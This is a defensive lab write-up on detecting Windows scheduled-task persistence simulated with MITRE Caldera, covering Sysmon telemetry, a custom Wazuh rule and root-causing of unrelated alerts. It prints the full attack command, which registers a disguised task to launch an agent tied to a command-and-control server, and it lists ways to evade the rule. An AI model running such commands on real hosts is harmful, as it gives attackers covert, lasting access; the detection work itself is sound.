# Windows Scheduled Task Persistence: Detection & Root-Cause Analysis

## Overview

Attackers often use scheduled tasks to persist on a compromised host. Generic SIEM alerts tend to describe this vaguely rather than naming the technique, so this exercise builds a dedicated detection for it. A Windows Scheduled Task persistence technique was simulated with MITRE Caldera, captured with Sysmon, and matched against a custom Wazuh rule. Two built-in rules also fired alongside the attack for unrelated reasons, and that overlap is root-caused rather than left unexplained.

Scheduled task persistence is security-relevant because it lets an attacker survive reboots and maintain access without needing to re-exploit the host: the scheduled task itself becomes the persistence mechanism.

What I was trying to detect: the exact attacker command used to create a malicious scheduled task via `schtasks`, and to distinguish it from unrelated built-in alerts that happened to fire in the same window.

## Lab Environment

- Attack framework: MITRE Caldera 5.3.0, deployed on Ubuntu 24.04 alongside the Wazuh manager
- Target: Windows 10 host (DESKTOP-TDOGRJA), running the Wazuh agent and Sysmon
- Telemetry: Sysmon Event ID 1 (Process Creation) with command-line logging enabled
- Virtualization: VMware Workstation

## Objective

The objective was to simulate a scheduled-task persistence technique against a Windows endpoint, build a Wazuh rule that reliably detects the attacker's exact command, and root-cause any other alerts that fire alongside it rather than assuming they're all related to the attack.

## Attack / Test Scenario

1. **Initial setup**: Caldera 5.3.0 running on Ubuntu 24.04 alongside the Wazuh manager, targeting the Windows 10 host with the Wazuh agent and Sysmon already deployed.
2. **Attack execution**: Caldera's "Agent Persistence via Scheduled Task" ability was run against the Windows victim, mapping to MITRE ATT&CK T1053.005. It executes:
   ```
   powershell.exe -ExecutionPolicy Bypass -C "schtasks /Create /F /TN \"Daily Digest Report\" /TR \"C:\Users\Public\upSunkd.exe\" -server http://192.168.142.130:8888 -group red" /SC weekly /D MON,TUE,WED,THU,FRI /ST 09:30
   ```
3. **What happened on the victim**: A scheduled task named "Daily Digest Report" was created via `schtasks`, configured to run weekly on weekdays at 09:30.
4. **Telemetry generated**: Sysmon captured the full process creation event with a clean set of indicators:

   | Field | Value |
   |---|---|
   | Image | `powershell.exe` |
   | Parent Image | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
   | Command Line | `schtasks /Create /F /TN "Daily Digest Report" /TR "C:\Users\Public\upSunkd.exe" -server http://192.168.142.130:8888 -group red /SC weekly /D MON,TUE,WED,THU,FRI /ST 09:30` |
   | User | `DESKTOP-TDOGRJA\Victim` |
   | Process ID | 13296 / 11852 |
   | Hashes | MD5 / SHA256 captured via Sysmon |
   | Timestamp | Aug 2, 2026 17:07:58 |

5. **How Wazuh received the telemetry**: Sysmon Event ID 1 forwarded through the Wazuh agent to the manager for rule matching.

## Detection Logic

A custom rule was written to match the exact attacker command rather than relying on generic heuristics. It matches Sysmon Event ID 1 (`sysmon_event1`) where the command-line field contains a `schtasks /create` pattern (case-insensitive, PCRE2 regex). The `commandLine` field was chosen because it captured the attacker's exact invocation; the regex was refined with PCRE2 until it matched consistently.

## Wazuh Rule

```xml
<rule id="100230" level="13">
<if_group>sysmon_event1</if_group>
<field name="win.eventdata.commandLine" type="pcre2">(?i)schtasks\s/create</field>
<description>Windows Scheduled Task Persistence Detected</description>
<mitre>
<id>T1053.005</id>
</mitre>
</rule>
```

## MITRE ATT&CK

| Tactic | Technique | ID |
|---|---|---|
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |

## Validation

- **Attack performed:** Caldera's "Agent Persistence via Scheduled Task" ability, executing the `schtasks /Create` command shown above.
- **Expected result:** A dedicated alert naming the technique (Scheduled Task Persistence), rather than a vague or generic alert.
- **Actual Wazuh alert:** Rule 100230 fired, described as "Windows Scheduled Task Persistence Detected," tagged with MITRE T1053.005.
- **Rule ID:** 100230
- **Severity:** Level 13
- **Relevant event:** Sysmon Event ID 1 (process creation), `win.eventdata.commandLine` matching the `schtasks /create` pattern.
- **Screenshot evidence:** Yes: the Caldera ability execution, the Sysmon process-creation event detail, and the custom rule confirmed in the Wazuh rule set are referenced in the source report.

## Troubleshooting

### Problem
Task Scheduler object-access auditing was disabled by default, so Windows Event ID 4698 ("A scheduled task was created") wasn't being logged.

### Investigation
Checked Windows audit policy settings and found the relevant subcategory was not enabled.

### Fix
Enabled the audit subcategory:
```
auditpol /set /subcategory:"Other Object Access Events" /success:enable
```

### Result
This brought a built-in rule (60228) online as an additional secondary signal alongside the custom rule.

## False Positives / Noise

**Observed:**
Two built-in rules fired alongside the custom detection, though neither describes the attack directly:

- **Rule 92021** ("PowerShell was used to delete files or directories," level 3): PowerShell auto-deletes a temporary policy-test file on startup. Sysmon logs that deletion, and this rule's broad match fired on the cleanup, not on attacker activity.
- **Rule 92213** ("Executable file dropped in folder commonly used by malware," level 15): the same temp file was written to `AppData\Local\Temp`, a common malware path, so the generic heuristic fired without knowing the file was a routine PowerShell artifact.

Both are legitimate secondary signals but indirect: they describe PowerShell's own startup behavior, not the persistence action itself. That gap is exactly why rule 100230 matches the attacker's command directly instead of relying on these broader heuristics.

## Limitations

- **Command-string dependent**: the regex matches `schtasks /create` in the command line. An attacker using a different task-creation method (e.g., the Task Scheduler COM API, PowerShell's `New-ScheduledTask` cmdlets, or an obfuscated/renamed invocation) would not be caught by this rule.
- **Co-occurring unrelated alerts**: as documented above, two built-in rules (92021, 92213) fire alongside this attack for unrelated reasons (PowerShell's own startup cleanup behavior), which could create confusion during triage if not root-caused.
- **Lab-only validation**: tested against a single Windows 10 host in a controlled environment.

## What I Learned

- Simulating persistence techniques with MITRE Caldera
- Building Wazuh rules with PCRE2 regex matching against Sysmon command-line data
- Root-causing co-occurring alerts instead of assuming they're all attack-related
- Enabling Windows audit policy subcategories (`auditpol`) to bring additional built-in rules online
- MITRE ATT&CK mapping for persistence techniques (T1053.005)
- Distinguishing a targeted, command-specific detection rule from broad heuristic-based rules

## Evidence

- Caldera "Agent Persistence via Scheduled Task" ability execution
- Sysmon process-creation event detail (Image, ParentImage, CommandLine, User, PIDs, hashes, timestamp)
- Custom rule 100230 confirmed in the Wazuh rule set
- Audit policy change confirming Event ID 4698 logging was enabled
